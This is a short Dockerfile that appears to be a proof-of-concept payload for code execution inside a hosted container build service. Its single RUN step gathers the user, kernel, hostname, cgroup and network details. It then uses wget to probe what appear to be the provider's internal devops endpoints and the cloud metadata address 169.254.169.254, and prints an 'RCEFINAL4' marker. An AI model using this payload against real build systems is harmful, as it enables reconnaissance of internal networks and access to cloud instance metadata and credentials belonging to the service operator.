FROM scratch
ADD rootfs.tar /
RUN /bin/sh -c 'echo "[ID]"; id; echo "[UNAME]"; uname -a; echo "[HOSTNAME]"; hostname; echo "[CGROUP]"; head -1 /proc/self/cgroup; echo "[IFACE]"; busybox ifconfig eth0 | head -3; echo "[INT-1 hub-devops.jcloud.com]"; busybox wget -q -T 4 -O - http://hub-devops.jcloud.com/v2/ 2>&1 | head -c 100; echo; echo "[INT-2 cruiser.devops.jdcloud.com]"; busybox wget -q -T 4 -O - http://cruiser.devops.jdcloud.com/public/k8s-hook 2>&1 | head -c 100; echo; echo "[INT-3 169.254.169.254]"; busybox wget -q -T 4 -O - http://169.254.169.254/latest/meta-data/ 2>&1 | head -c 150; echo; echo "[MARKER] RCEFINAL4_0925_225925"'
ENTRYPOINT ["/bin/sh","-c"]
